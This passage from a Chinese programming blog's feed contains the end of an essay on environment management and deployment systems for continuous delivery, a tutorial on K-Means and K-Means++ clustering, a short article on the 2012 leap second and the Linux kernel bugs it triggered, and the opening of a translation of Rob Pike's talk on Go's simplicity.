<span class="ez-toc-section" id="%E4%B8%89%E3%80%81%E4%BB%BB%E8%84%89-%E7%8E%AF%E5%A2%83%E7%AE%A1%E7%90%86"></span>三、任脉——环境管理<span class="ez-toc-section-end"></span>
</h4>
<p>什么是环境？</p>
<p>系统运行所依赖和包含的一切就是其环境：硬件、操作系统，网络资源（IP地址、域名），服务容器，服务器软件配置，环境亦是，运行时依赖的命令和包，项目本身的包和配置都是环境的一部分。对于部署而言，广义上，这些通通应该纳入环境管理的范畴，但狭义上，从软件系统的角度看，一个环境就是其运行需要的软件及其配置（我们先把操作系统和网络资源当做基础设施，其在部署时已处于就位的情况）。因此：</p>
<p><strong>项目A的生产环境 = 项目A本身的软件包 + 项目A运行时依赖的软件包 + 项目A运行时依赖的其它软件 + 项目A的配置信息</strong></p>
<p>由于，项目本身的软件包、项目运行时依赖的软件包，以及项目运行时依赖的其它软件在本质上没有区别——都是软件，上面的定义可以进一步抽象为：</p>
<p><strong>环境 = 软件包 + 配置信息</strong></p>
<p>在这个定义下，我们就必须将运行环境的软件解构，并以包的形式导入到公司的整个项目资源库中，比如Apache将作为一个包被导入，而Apache依赖的其它包也将依次被导入，并建立起正确的依赖关系。而且，在导入的过程中还必须做些相应的调整，如，环境变量的读取和设置，必须来自于环境配置模块，而不要修改系统的环境变量，防止不同环境在系统环境配置上相互影响和依赖。</p>
<p>再回头审视我们的示例，项目A的生产环境可以部署在不同的区域，对于各个区域可能有定制化的设定。这就像面向对象中的类，可以通过继承使子类重用父类的公有属性和行为并添加自己特有的信息。因此，环境的概念模型如图：</p>
<p><a href="https://coolshell.cn/?attachment_id=7725" rel="attachment wp-att-7725"><img alt="image placeholder" ></a></p>
<p>通过这样的关系，我们很容易为示例的复杂环境建立一种简单的结构，对于项目A：</p>
<p><a href="https://coolshell.cn/?attachment_id=7729" rel="attachment wp-att-7729"><img alt="image placeholder" ></a></p>
<p>这里，环境依然是处于知识层面（Knowledge Level），它并未与具体的基础设施相关联。当我们将一个环境“具现化”成一个运行系统时，我们就产生了一个真正的环境实例。在这两者之间，我们还必须要考虑环境实例的使用目的（开发？测试？……）以及安装所依赖的其它信息（如机器），因此，我们需要增加一个环境目标来集中这些信息，而且由于不同目标的环境可能会有所差别，因此，环境目标也需要配置的能力。概念模型如图：</p>
<p><a href="https://coolshell.cn/?attachment_id=7731" rel="attachment wp-att-7731"><img alt="image placeholder" ></a></p>
<p>图中的环境实例是如何产生的呢？<strong>部署</strong>，<strong>一次部署可能会产生一个环境实例。</strong>一系列部署将产生对应于环境目标的多个环境实例，除去当前起作用的环境实例外（最新的），其它的是历史环境实例。<strong>通过在历史环境实例中切换，我们自然而然的就可以使整个环境回滚，因为项目所依赖的一切都已经成为的环境中的软件包，而且环境依赖的包的版本会随着部署具体确定下来。</strong>如此一来，我们便可以给每个环境实例分配一个版本号，再通过环境实例的版本号与软件包的版本对应起来，从而得知一次部署时应用的具体软件包，如图：</p>
<p><a href="https://coolshell.cn/?attachment_id=7732" rel="attachment wp-att-7732"><img alt="image placeholder" ></a></p>
<p>目前的环境管理结构，已经可以解决场景1、2和5的问题。那<strong>么对于场景2，运行时依赖，环境管理应该如何解决呢？</strong></p>
<p>细心的朋友，可能已经发现，<strong>在环境层面上我们确定了环境依赖的软件包</strong>，这里有两个隐藏的含义：</p>
<ul>
<li>环境定义的是对软件包的运行时依赖</li>
<li>由于环境是一个逻辑上的概念，因此其所用的软件包也是一个逻辑上的概念（相对于版本控制系统中的软件包）</li>
</ul>
<p>我们也已经知道，在部署时，一个环境实例将具体的确定其依赖的软件包的版本。某个版本的软件包最终与代码库中的物理的软件包相关联。但软件包是运行时的安装包，因此，它应该是代码库中包编译的结果。在对代码库的包编译时，既要将结果打上版本保存起来，也好在两者的版本间建立关系，最后，编译结果应该是某种既定的安装包目录文件结构。</p>
<p>另外，当环境包含的包比较多时，运行时版本树会非常大，手动的指定全部的包的版本将是一个非常大的体力劳动，这部分工作也要得到简化。由此，我们必须</p>
<div>
<ul>
<li><strong>建立逻辑软件包版本和版本库中软件包版本间的关系</strong></li>
<li><strong><strong>为相互依赖的包编译并打上统一的标签</strong></strong></li>
<li><strong>简化运行时包依赖关系的生产</strong></li>
<li><strong>简化运行时包依赖的指定（可参考apt-get和RubyGem，环境只需指定直接依赖的包，间接依赖的包从运行时依赖树中自动导入）</strong></li>
</ul>
<div>一个可能的简单结构如下：</div>
<p><a href="https://coolshell.cn/?attachment_id=7736" rel="attachment wp-att-7736"><img alt="image placeholder" ></a></p>
<p>上述讨论还没有涉及操作系统，<strong>如果我们的运行机器要支持多个系统，我们又该怎么办？？？</strong></p>
<p>配置信息也是个大问题，大家可以思考</p>
<ul>
<li><strong>环境配置和应用配置如何区分？</strong></li>
<li><strong>如何简化环境配置工作？</strong></li>
<li><strong>如何使环境配置的效果只对具体环境有效，而不会泄露到环境外部？</strong></li>
</ul>
</div>
<p>再者，</p>
<ul>
<li><strong>如何使应用支持多运行目标？</strong></li>
<li><strong>环境管理如何能方便开发环境的调试？</strong></li>
<li><strong>要如何简化版本的选择?</strong></li>
<li><strong><strong>在多个包有编译和运行时依赖时，编译时如何检查以减少引入兼容性问题的风险？</strong></strong></li>
</ul>
<p>这些都留待大家思考。</p>
<h4>
<span class="ez-toc-section" id="%E5%9B%9B%E3%80%81%E7%9D%A3%E8%84%89-%E9%83%A8%E7%BD%B2%E7%B3%BB%E7%BB%9F"></span>四、督脉——部署系统<span class="ez-toc-section-end"></span>
</h4>
<p>《持续集成》和《持续交付》中都对部署有详细的讨论，不在赘述。<strong>在我看来，部署其就是按照其目的执行一系列步骤将环境置于其目的所指向的状态中</strong>。我们一会再回国头来看这段文绉绉的话，先看看第一部分持续集成的环境下，我们部署的步骤可能会是下面这个样子：</p>
<ol>
<li>登陆目标机（ssh）</li>
<li>停止服务</li>
<li>清理环境</li>
<li>准备安装环境（创建文件夹等）</li>
<li>安装项目包（rsync，解压，权限设置等）</li>
<li>配置环境变量</li>
<li>启动服务</li>
<li>……</li>
</ol>
<p>而在第二部分的<strong>情景4</strong>中，我们看到如果对不同的持续集成环境建立不同的部署脚本和环境维护脚本，这部署过程的维护会非常繁琐。基于第三部分的环境管理，我们可以将部署过程抽象为：</p>
<p><a href="https://coolshell.cn/?attachment_id=7737" rel="attachment wp-att-7737"><img alt="image placeholder" ></a></p>
<p>现在回到开头那个文绉绉的描述：<strong>部署其就是按照其目的执行一系列步骤将环境置于其目的所指向的状态中</strong>。</p>
<p>由于我们已经将部署作为环境管理的一部分，而环境又是对外提供服务的最小实体，因此，对环境的部署就是要根据部署的类型，在环境上按一定的步骤执行一系列操作，从而使环境置于部署类型所要的状态，这个过程中可能会生成对应的环境实例。举例来说，我们可能会修改环境相关的一些配置，然后重启环境，显然，这种情况下不需要下载安装软件包（没有改变），因此也就不需要生成环境实例。</p>
<p>对于标准的部署——安装软件包并启动环境，可能的步骤将会是：</p>
<ol>
<li>选择将要部署的软件包的版本</li>
<li>生成新的环境实例（确定环境实例的版本和其依赖包的版本，确定环境配置等）</li>
<li>清理和准备目标机环境</li>
<li>下载包</li>
<li>设置环境配置</li>
<li>环境实例切换</li>
<li>生成部署报告</li>
<li>……</li>
</ol>
<p>好，部署系统和环境管理各就各位，我们可以将各个项目环境纳入我们的环境管理之中，甚至是持续集成环境本身。再补充一句，要让部署系统和环境管理能很好的发挥作用，我们即需要一个简单一致的UI界面（为开发人员），也需要提供一个清晰明了的服务接口（供外部系统调用，如持续部署系统）。<strong>对于与环境管理相关的机器状态管理，网络资源的配置等等，本文不再涉及，大家可以自己思考</strong>。环境管理的实现、编译系统改造以及持续部署的具体实现，另作文章探讨。</p>
<p>就技术而言（不考虑围绕持续部署的过程实践），环境管理、部署系统以及我们没有提及的编译系统改造才是生产线的真正引擎，持续部署不过是水到渠成的传送带而已。</p>
<h4>
<span class="ez-toc-section" id="%E4%BA%94%E3%80%81%E6%B2%A1%E5%AE%8C"></span>五、没完<span class="ez-toc-section-end"></span>
</h4>
<p>打通了任督二脉后，事还还没有完，还有很多细节上的问题。你想，这个工具实在是太好用了，于是公司里成百上千的工程师们都在使用这个自动化部署系统，我们又会面对很多很多问题：</p>
<ul>
<li>
<strong>部署系统的性能问题</strong>。几百号人不停地在把他们的软件部署到自己的机器上，部署到测试环境，部署到生产环境，一天之内一个人可能会要部署N次，回滚N次，不但有大量部署请求，还有大量的文件在网络上传输。你得想想这套部署系统如何解决这些性能问题，还得考虑未来更大规模的性能水平扩展问题。</li>
</ul>
<ul>
<li>
<strong>目标机环境的管理。</strong>在目标运行机上需要解决几个问题：1）两个环境间如果有一些的一样的包，那就没有必要再下载了，这样可以节约时间。2）每次部署都需要把老的部署环境给保留下来，这样方便在新旧环境下的切换。这两点对于在生产环境下部署非常关键。（这需要环境内所有软件的绿色安装才能更容易达到这个目标，因些，Unix/Linux会比Windows更容易做到这点）</li>
</ul>
<ul>
<li>
<strong>部署一致性事务问题</strong>。有时候，我们需要同时部署若干台服务器，比如：包A到机器MA，包B到机器MB，包C到机器MC，……（Web Service的SOA架构），这些包之间有运行依赖性和兼容性问题，要么一次性全部完成，要么就全部失败。回滚也是一样的，这是一个部署事务或部署一致性的问题。如何解决呢？</li>
</ul>
<ul>
<li>
<strong>部署环境的版本控制问题</strong>。前面说过，我们的一个环境就会和若干个包的版本耦合，环境必需管理要部署的包的版本。于是，当你的部署越来越多的时候，各个环境的包的版本开始出现混乱，各种依赖间的版本也会出现不统一的情况，也就是说，就算你有这样的一个工具，在一个高速开发的环境下，我们的部署环境的管理还是会出现很多混乱的情况，需要你不断地统一大家的开发、测试环境。</li>
</ul>
<ul>
<li>
<strong>部署计划</strong>。我们可能会有很多部署计划，比如：设定定时部署，提升或降低部署优先级，部署事务定义，部署策略（如：先部署10%的机器，如果没有问题，再把剩下的系统部署了），热切计划和策略…… 等等 ，等等 。</li>
</ul>
<ul>
<li>
<strong>部署的监控和维护</strong>。任何软件和系统都会有这样的问题，当规模上去了以后，我们的自动化部署系统的监控和维护的复杂度并不亚于一个大型的互联网应用。</li>
</ul>
<div>这样的问题会有很多，基本上来说，<strong>这样一个持续集成持续部署的自动化系统并不是那么简单的事，其开发工作量和一个标准的大型互联网业务系统没什么两样</strong>。</div>
<h4>
<span class="ez-toc-section" id="%E5%85%AD%E3%80%81%E6%80%BB%E7%BB%93"></span>六、总结<span class="ez-toc-section-end"></span>
</h4>
<p>这里只谈一点自己的看法，从传统的持续集成到面向大型软件的持续部署，我们将系统所依赖的软件环境和软件包抽象为一致的实体纳入到管理之中，并将运维人员的工作真正的分摊到开发人员身上。而云计算的出现，使得计算机本身也可以自动化的创建和回收，这样环境管理的范畴将进一步扩充。相应的，部署的能力和灵活性也是一次质的飞跃，将再一次减轻运维人员的工作压力。</p>
<p>说了这么多废话，总结一下自己的观点，对于向大型软件企业推销基于持续集成的持续部署（交付）的哥们：</p>
<ul>
<li>
<strong>你就是在耍流氓</strong>，如果你不解决环境管理！！！</li>
<li>
<strong>你就是在耍流氓</strong>，如果你不建立部署系统！！！</li>
<li>
<strong>你就是在耍流氓</strong>，如果你不扩展编译系统！！！</li>
<li>
<strong>你就是在耍流氓</strong>，如果你只是推销小团队的实践而不考虑改造大环境！！！</li>
<li>
<strong>你就是个流氓</strong>，如果你只是不断地告诉别人怎么做，自己却从来不动手写一个测试或建立一个持续集成环境！！！</li>
</ul>
<p>最后，用Linus最经典的话来结束本文——“ Talk is Cheap, Show me the Code！”</p>
<p>（<strong>注：本文由<a href="https://weibo.com/renfake" target="_blank">@常新居士</a>完成初稿，我做了一些编辑，主要写了第五节“没完”</strong> ）</p>
 ]]></content>
<pubDate>2012-06-25T08:20:08+08:00</pubDate>
<guid>https://coolshell.cn/articles/7657.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ K-Means 算法 ]]></title>
<link>https://coolshell.cn/articles/7779.html</link>
<content><![CDATA[ 
<p>最近在学习一些数据挖掘的算法，看到了这个算法，也许这个算法对你来说很简单，但对我来说，我是一个初学者，我在网上翻看了很多资料，发现中文社区没有把这个问题讲得很全面很清楚的文章，所以，把我的学习笔记记录下来，分享给大家。</p>
<p>在数据挖掘中， <strong><em>k</em>-Means 算法</strong>是一种 <a title="Cluster analysis" href="https://en.wikipedia.org/wiki/Cluster_analysis">cluster analysis</a> 的算法，其主要是来计算数据聚集的算法，主要通过不断地取离种子点最近均值的算法。</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E9%97%AE%E9%A2%98" title="问题">问题</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#%E7%AE%97%E6%B3%95%E6%A6%82%E8%A6%81" title="算法概要">算法概要</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#%E6%B1%82%E7%82%B9%E7%BE%A4%E4%B8%AD%E5%BF%83%E7%9A%84%E7%AE%97%E6%B3%95" title="求点群中心的算法">求点群中心的算法</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#K-Means%E7%9A%84%E6%BC%94%E7%A4%BA" title="K-Means的演示">K-Means的演示</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-5" href="#K-Means_%E7%AE%97%E6%B3%95" title="K-Means ++ 算法">K-Means ++ 算法</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-6" href="#K-Means_%E7%AE%97%E6%B3%95%E5%BA%94%E7%94%A8" title="K-Means 算法应用">K-Means 算法应用</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E9%97%AE%E9%A2%98"></span>问题<span class="ez-toc-section-end"></span>
</h4>
<p>K-Means算法主要解决的问题如下图所示。我们可以看到，在图的左边有一些点，我们用肉眼可以看出来有四个点群，但是我们怎么通过计算机程序找出这几个点群来呢？于是就出现了我们的K-Means算法（<a title="K-means Clustering 算法" href="https://en.wikipedia.org/wiki/K-means_clustering" target="_blank">Wikipedia链接</a>）</p>
<figure id="attachment_7780" aria-describedby="caption-attachment-7780" style="width: 600px" class="wp-caption aligncenter"><img alt="image placeholder" ><figcaption id="caption-attachment-7780" class="wp-caption-text">K-Means 要解决的问题</figcaption></figure>
<h4>
<span class="ez-toc-section" id="%E7%AE%97%E6%B3%95%E6%A6%82%E8%A6%81"></span>算法概要<span class="ez-toc-section-end"></span>
</h4>
<p>这个算法其实很简单，如下图所示：</p>
<p><span id="more-7779"></span></p>
<figure id="attachment_7781" aria-describedby="caption-attachment-7781" style="width: 504px" class="wp-caption aligncenter"><img alt="image placeholder" ><figcaption id="caption-attachment-7781" class="wp-caption-text">K-Means 算法概要</figcaption></figure>
<p>从上图中，我们可以看到，<strong>A, B, C, D, E 是五个在图中点。而灰色的点是我们的种子点，也就是我们用来找点群的点</strong>。有两个种子点，所以K=2。</p>
<p>然后，K-Means的算法如下：</p>
<ol>
<li>随机在图中取K（这里K=2）个种子点。</li>
<li>然后对图中的所有点求到这K个种子点的距离，假如点Pi离种子点Si最近，那么Pi属于Si点群。（上图中，我们可以看到A,B属于上面的种子点，C,D,E属于下面中部的种子点）</li>
<li>接下来，我们要移动种子点到属于他的“点群”的中心。（见图上的第三步）</li>
<li>然后重复第2）和第3）步，直到，种子点没有移动（我们可以看到图中的第四步上面的种子点聚合了A,B,C，下面的种子点聚合了D，E）。</li>
</ol>
<p>这个算法很简单，但是有些细节我要提一下，求距离的公式我不说了，大家有初中毕业水平的人都应该知道怎么算的。我重点想说一下“求点群中心的算法”</p>
<h4>
<span class="ez-toc-section" id="%E6%B1%82%E7%82%B9%E7%BE%A4%E4%B8%AD%E5%BF%83%E7%9A%84%E7%AE%97%E6%B3%95"></span>求点群中心的算法<span class="ez-toc-section-end"></span>
</h4>
<p>一般来说，求点群中心点的算法你可以很简的使用各个点的X/Y坐标的平均值。不过，我这里想告诉大家另三个求中心点的的公式：</p>
<p><strong>1）Minkowski Distance 公式 ——</strong> λ 可以随意取值，可以是负数，也可以是正数，或是无穷大。</p>
<p><img alt="image placeholder" ></p>
<p><strong>2）Euclidean Distance 公式 </strong>—— 也就是第一个公式 λ=2 的情况</p>
<p><img alt="image placeholder" ></p>
<p><strong>3）CityBlock Distance 公式 </strong>—— 也就是第一个公式 λ=1 的情况</p>
<p><img alt="image placeholder" ></p>
<p>这三个公式的求中心点有一些不一样的地方，我们看下图（对于第一个 λ 在 0-1之间）。</p>
<p style="text-align: center;"><img alt="image placeholder" >   <img alt="image placeholder" >  <img alt="image placeholder" ></p>
<p style="text-align: center;"><strong>（1）Minkowski Distance     （2）<strong>Euclidean Distance    （3） <strong>CityBlock Distance</strong></strong></strong></p>
<p style="text-align: left;">上面这几个图的大意是他们是怎么个逼近中心的，第一个图以星形的方式，第二个图以同心圆的方式，第三个图以菱形的方式。</p>
<h4 style="text-align: left;">
<span class="ez-toc-section" id="K-Means%E7%9A%84%E6%BC%94%E7%A4%BA"></span>K-Means的演示<span class="ez-toc-section-end"></span>
</h4>
<p style="text-align: left;">如果你以”<a href="https://www.google.com/search?hl=zh-CN&amp;q=K+Means+Demo" target="_blank">K Means Demo</a>“为关键字到Google里查你可以查到很多演示。这里推荐一个演示</p>
<p style="text-align: center;"><a href="http://home.dei.polimi.it/matteucc/Clustering/tutorial_html/AppletKM.html">http://home.dei.polimi.it/matteucc/Clustering/tutorial_html/AppletKM.html</a></p>
<p style="text-align: left;">操作是，鼠标左键是初始化点，右键初始化“种子点”，然后勾选“Show History”可以看到一步一步的迭代。</p>
<p style="text-align: left;">注：这个演示的链接也有一个不错的 <a href="http://home.dei.polimi.it/matteucc/Clustering/tutorial_html/index.html" target="_blank">K Means Tutorial</a> 。</p>
<h4 style="text-align: left;">
<span class="ez-toc-section" id="K-Means_%E7%AE%97%E6%B3%95"></span>K-Means ++ 算法<span class="ez-toc-section-end"></span>
</h4>
<p>K-Means主要有两个最重大的缺陷——都和初始值有关：</p>
<ul>
<li> K 是事先给定的，这个 K 值的选定是非常难以估计的。很多时候，事先并不知道给定的数据集应该分成多少个类别才最合适。（ <a href="https://en.wikipedia.org/wiki/Multispectral_pattern_recognition" target="_blank">ISODATA 算法</a>通过类的自动合并和分裂，得到较为合理的类型数目 K）</li>
</ul>
<ul>
<li>K-Means算法需要用初始随机种子点来搞，这个随机种子点太重要，不同的随机种子点会有得到完全不同的结果。（<a href="https://en.wikipedia.org/wiki/K-means%2B%2B" target="_blank">K-Means++算法</a>可以用来解决这个问题，其可以有效地选择初始点）</li>
</ul>
<p>我在这里重点说一下 K-Means++算法步骤：</p>
<ol>
<li>先从我们的数据库随机挑个随机点当“种子点”。</li>
<li>对于每个点，我们都计算其和最近的一个“种子点”的距离D(<var>x</var>)并保存在一个数组里，然后把这些距离加起来得到Sum(D(<var>x</var>))。</li>
<li>然后，再取一个随机值，用权重的方式来取计算下一个“种子点”。这个算法的实现是，先取一个能落在Sum(D(<var>x</var>))中的随机值Random，然后用Random -= D(<var>x</var>)，直到其&lt;=0，此时的点就是下一个“种子点”。</li>
<li>重复第（2）和第（3）步直到所有的K个种子点都被选出来。</li>
<li>进行K-Means算法。</li>
</ol>
<p>相关的代码你可以在这里找到“<a href="https://rosettacode.org/wiki/K-means%2B%2B_clustering" target="_blank">implement the K-means++ algorithm</a>”(墙) 另，<a href="https://commons.apache.org/math/api-2.1/index.html?org/apache/commons/math/stat/clustering/KMeansPlusPlusClusterer.html" rel="nofollow" target="_blank">Apache 的通用数据学库也实现了这一算法</a></p>
<h4>
<span class="ez-toc-section" id="K-Means_%E7%AE%97%E6%B3%95%E5%BA%94%E7%94%A8"></span>K-Means 算法应用<span class="ez-toc-section-end"></span>
</h4>
<p>看到这里，你会说，K-Means算法看来很简单，而且好像就是在玩坐标点，没什么真实用处。而且，这个算法缺陷很多，还不如人工呢。是的，前面的例子只是玩二维坐标点，的确没什么意思。但是你想一下下面的几个问题：</p>
<p style="padding-left: 30px;">1）如果不是二维的，是多维的，如5维的，那么，就只能用计算机来计算了。</p>
<p style="padding-left: 30px;">2）二维坐标点的X, Y 坐标，其实是一种向量，是一种数学抽象。现实世界中很多属性是可以抽象成向量的，比如，我们的年龄，我们的喜好，我们的商品，等等，能抽象成向量的目的就是可以让计算机知道某两个属性间的距离。如：我们认为，18岁的人离24岁的人的距离要比离12岁的距离要近，鞋子这个商品离衣服这个商品的距离要比电脑要近，等等。</p>
<p><strong>只要能把现实世界的物体的属性抽象成向量，就可以用K-Means算法来归类了</strong>。</p>
<p>在 《<a id="ctl01_lnkTitle" href="https://www.cnblogs.com/leoo2sk/archive/2010/09/20/k-means.html">k均值聚类(K-means)</a>》 这篇文章中举了一个很不错的应用例子，作者用亚洲15支足球队的2005年到1010年的战绩做了一个向量表，然后用K-Means把球队归类，得出了下面的结果，呵呵。</p>
<ul>
<li>亚洲一流：日本，韩国，伊朗，沙特</li>
<li>亚洲二流：乌兹别克斯坦，巴林，朝鲜</li>
<li>亚洲三流：中国，伊拉克，卡塔尔，阿联酋，泰国，越南，阿曼，印尼</li>
</ul>
<p>其实，这样的业务例子还有很多，比如，分析一个公司的客户分类，这样可以对不同的客户使用不同的商业策略，或是电子商务中分析商品相似度，归类商品，从而可以使用一些不同的销售策略，等等。</p>
<p>最后给一个挺好的算法的幻灯片：<a href="https://www.cs.cmu.edu/~guestrin/Class/10701-S07/Slides/clustering.pdf">http://www.cs.cmu.edu/~guestrin/Class/10701-S07/Slides/clustering.pdf</a></p>
<p>（全文完）</p>
 ]]></content>
<pubDate>2012-06-29T08:24:02+08:00</pubDate>
<guid>https://coolshell.cn/articles/7779.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 关于闰秒 ]]></title>
<link>https://coolshell.cn/articles/7804.html</link>
<content><![CDATA[ 
<p>2012年6月30日，也就今天晚上，时间会多出现一秒，也就是我们所说的闰秒。我不知道大家对闰秒的了解有多少，所以写下这篇文章。</p>
<h4>背景知识</h4>
<p>闰秒是在在<a href="https://en.wikipedia.org/wiki/Coordinated_Universal_Time" target="_blank">UTC</a>（中文“世界标准时间”或“世界协调时间<strong>”</strong>／英文“<strong>C</strong>oordinated <strong>U</strong>niversal <strong>T</strong>ime”／法文“<strong>T</strong>emps <strong>U</strong>niversel <strong>C</strong>ordonné”）是基于<a href="https://en.wikipedia.org/wiki/Atomic_clock" target="_blank">Atomic Clock</a>（原子时钟）的一种时间，向太阳时（<a title="Mean solar day" href="https://en.wikipedia.org/wiki/Mean_solar_day">Solar Time </a>）对齐的一种方法，因为太阳时是根据地球公转来计算的。所以，1972年制定的UTC为了确保其时间相对于UTC的时间误差不能超过0.9秒，因此在过一段时间后需要加一秒。下图是有UTC以来闰秒的调整表（来自<a href="https://zh.wikipedia.org/wiki/%E9%97%B0%E7%A7%92" target="_blank">Wikipedia闰秒的中文词条</a>）</p>
<p><img alt="image placeholder" ></p>
<p><span id="more-7804"></span></p>
<p>从上表中我们可以看到，从1972年到现在，在这四十年里已经进行过25次的闰秒调整。闰秒是在每年6月或12月的最后一天的最后一分钟进行跳秒或不跳秒。是否加入闰秒由位于巴黎的国际地球自转和参考坐标系统服务（IERS – <a title="International Earth Rotation and Reference Systems Service" href="https://en.wikipedia.org/wiki/International_Earth_Rotation_and_Reference_Systems_Service">International Earth Rotation and Reference Systems Service</a>）决定。如果决定加入闰秒，那么这一秒是被加在第二天的00:00:00前的，也就是说，时间会出现23:59:60的情况，然后才是第二天的00:00:00。如果是负闰秒的话，23:59:58的下一秒就直接跳到第二天的00:00:00了。<strong>现在，所有闰秒都是正闰秒</strong>。</p>
<h4>计算机处理闰秒</h4>
<p>那么，对于我们的电脑系统来说，怎么处理这个闰秒呢？一般来说，我们需要为我们的电脑系统配置UTC时钟，并通过NTP (<a title="Network time protocol" href="https://en.wikipedia.org/wiki/Network_time_protocol">Network time protocol</a>)来进行时间同步，NTP服务器会一级一级地下发闰秒事件通知直到最边缘的NTP服务器，然后NTP服务器就会把闰秒通知发给客户端的操作系统，由操作系统来处理闰秒通知。</p>
<p>虽然闰秒调整对普通民众的日常生活不会产生影响。不过，<strong>这个问题将影响部分开启ntp服务的Linux操作系统——会导致Linux内核Crash！</strong>Linux kernel是在2.6.18-164.e15之后的版本中解决了这个问题。<span style="color: #cc0000;">换句话说，Linux kernel低于<strong>2.6.18-164</strong>的Linux系统，无论是什么公司的Linux都将受到影响</span>。（今晚过后大家可以查看一下你的Linux系统日志，看看闰秒有没有发生）</p>
<p>可以参看下面的bug描述：</p>
<ul>
<li><a href="https://lkml.org/lkml/2009/1/2/373" target="_blank">LKML: Chris Adams: Re: Bug: Status/Summary of slashdot leap-second crash on new years 2008-2009</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=479765" target="_blank">Bug 479765 – Leap second message can hang the kernel</a></li>
</ul>
<p>那么，我们的操作系统是怎么处理正闰秒通知的？通常来说有三种实现：</p>
<ol>
<li>后退一秒。</li>
<li>停止一秒。</li>
<li>真正的增加一秒。</li>
</ol>
<p>懂编程的人一眼就能看出来，前两种方式是以一种Workaround或Hack的方式解决这个问题。第一种方式会导致一些基于timestamp的消息通知乱序了，而第二种会导致出现两个一模一样的timestamp。最后一种不会出现timestamp的问题。对了，你还记得以前那篇《<a href="https://coolshell.cn/articles/5075.html" rel="bookmark">你确信你了解时间吗？</a>》的文章吗？</p>
<p>最后，说说Windows，Windows  Time Service不支持闰秒通知，所以，当闰秒发生的时候，你的Windows上的时间会比实际时间快一秒钟，这需要等下一次的时钟同步才会完成修正。你可以查看这篇文章：<a href="https://support.microsoft.com/kb/909614/en-us">http://support.microsoft.com/kb/909614/en-us</a></p>
<p>（全文完）</p>
 ]]></content>
<pubDate>2012-06-30T17:16:34+08:00</pubDate>
<guid>https://coolshell.cn/articles/7804.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 少即是极多 ]]></title>
<link>https://coolshell.cn/articles/7771.html</link>
<content><![CDATA[ 
<p>【<span style="color: #cc0000;"><strong>感谢网友 <a href="https://twitter.com/#!/innocentim" target="_blank">@innocentim</a></strong> (Twitter)<strong> 投稿</strong></span>】</p>
<p>这是一篇翻译练习。力图保留原意。若有不准确处，求速速指出。<a href="https://commandcenter.blogspot.com/2012/06/less-is-exponentially-more.html" target="_blank">猛击此处</a>（墙）看原文。作者为Rob Pike，贝尔实验室来的大牛，现在就职于Google。他主导了Go语言的创建工作。下面是正文——</p>
<p style="text-align: center; font-size: 9pt;"><span style="color: #999999;">——————————————正文分隔线——————————————</span></p>
<p><img alt="image placeholder" >这是我在2012年6月的Go SF上演讲的文本。</p>
<p>这是一个个人演讲。 我承认，虽然面前的团队让Go诞生并延续，但是我的观点并不代表任何其他Go语言小组成员的意见。 我也想感谢Go SF的组织者提供这个和你们交流的机会。</p>
<p>几星期前我被问起:“你在推出Go的过程中遇到的最大的惊奇是什么？”我立即意识到了答案: 虽然我们希望C++程序员意识到Go是个较好的选择，但是令人意外的是，大多数Go程序员来自Python和Ruby这样的动态语言，而很少有来自C++的。</p>
<p>我们——Ken，Robert和我——是C++程序员(译者: Ken也用C++？)，当时在为解决我们所写的这类软件产生的问题设计一个新的语言。 这似乎有点自相矛盾，因为别的C++程序员根本不关心这些问题，更不会去设计一个语言。</p>
<p>我今天想说的是关于那些激发我们创造Go的事情，和为什么它本不应令我们如此惊讶。 我保证这些内容更多与Go相关而不是C++，所以即使你不很了解C++你也能跟得上。</p>
<p>回答可以这样归结: 你认为”少即是多”呢，还是”少就是少”？</p>
<p>这里有个比喻，将以真实故事的形式给出。 贝尔实验室中心原来发放3位数号码: 物理研究是111，计算科学研究是127，如此这般。 1980年代早期，一个便笺飞过来说”鉴于你们对研究的理解有所加深，将为你们的号码多加上一位，以便更好地体现你们的工作”。 所以我们中心的号码变成了1127。 Ron Hardin半当真地开玩笑说如果我们真的理解我们的世界更好一点的话，我们将丢掉一位数字，将127变成27。 当然主管没听到这个笑话(这也不是我们希望的)，但是我想这里面有点值得思考的东西。 少即是多。 你理解得越好，你将变得越简洁。</p>
<p><span id="more-7771"></span></p>
<p>先记住这句话。</p>
<p>回到2007年9月，我在做一个庞大的Google C++项目的细微但核心的部分。 开发必须交互进行，但是我这部分在我们的Google编译集群上要编译45分钟。 同时，有个消息传过来说一群在C++社区的Google员工将开一场讲座，介绍即将到来的C++0x(现在称为C++11)。</p>
<p>在那场持续一小时的讲座中，我们听说了诸如计划中的35个新特性的说法——事实上还有更多，但是那场讲座只说有35个。 有些特性当然是细微的，但是讲座中谈到的至少是足够重要的。 提到的特性中，有些十分微妙并难以理解，比如右值引用(rvalue references); 有些特别符合C++范儿，比如可变参数模板(variadic templates); 还有些十分疯狂，比如用户定义的字面量(user-defined literals)。</p>
<p>那时候我问了自己一个问题: C++社区真的觉得C++错在没有足够多的特性么？ 显然，从Ron Hardin的笑话的角度看，简化语言将比添加新特性取得更好的效果。 当然，对C++来说这很不靠谱，但是先记住这点。</p>
